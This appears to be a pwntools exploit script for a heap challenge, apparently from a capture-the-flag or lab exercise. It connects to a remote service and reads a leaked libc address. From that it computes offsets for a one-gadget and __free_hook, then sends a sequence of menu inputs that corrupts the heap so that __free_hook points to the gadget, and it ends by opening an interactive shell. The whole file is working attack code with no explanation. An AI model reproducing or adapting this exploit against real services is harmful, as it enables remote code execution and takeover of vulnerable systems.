from pwn import *

conn = remote('10.21.232.108', 5555)

conn.settimeout(5)

addr_of_libc = conn.recvline().decode()
addr_of_libc = addr_of_libc.split("0x")[1]
hex_addr_of_libc = int(addr_of_libc, 16)
phex_addr_of_libc = p64(hex_addr_of_libc)

offset = "4f302"
offsetint = int(offset,16)
hex_addr_of_binsh = hex_addr_of_libc + offsetint
phex_addr_of_binsh = p64(hex_addr_of_binsh)

gotmallochook="3ebc30"
gotmallochookint=int(gotmallochook,16)
hex_addr_of_gotmallochook = hex_addr_of_libc + gotmallochookint
phex_addr_of_gotmallochook=p64(hex_addr_of_gotmallochook)

gotfreehook="3ed8e8"
gotfreehookint=int(gotfreehook,16)
hex_addr_of_gotfreehook = hex_addr_of_libc + gotfreehookint
phex_addr_of_gotfreehook=p64(hex_addr_of_gotfreehook)

conn.sendline(b"a")

conn.sendline(b"U1")

conn.sendline(b"1")

conn.sendline(b"a")

conn.sendline(b"U2")

conn.sendline(b"2")

conn.sendline(b"r")

conn.sendline(b"2")

conn.sendline(b"r")

conn.sendline(b"1")

conn.sendline(b"a")

conn.sendline((b"\x00")*32 + phex_addr_of_gotfreehook)

conn.sendline(b"1")

conn.sendline(b"a")

conn.sendline(b"U2")

conn.sendline(b"2")

conn.sendline(b"a")

conn.sendline(phex_addr_of_binsh)

conn.sendline(b"3")

conn.sendline(b"r")

conn.sendline(b"2")

conn.interactive()

conn.close()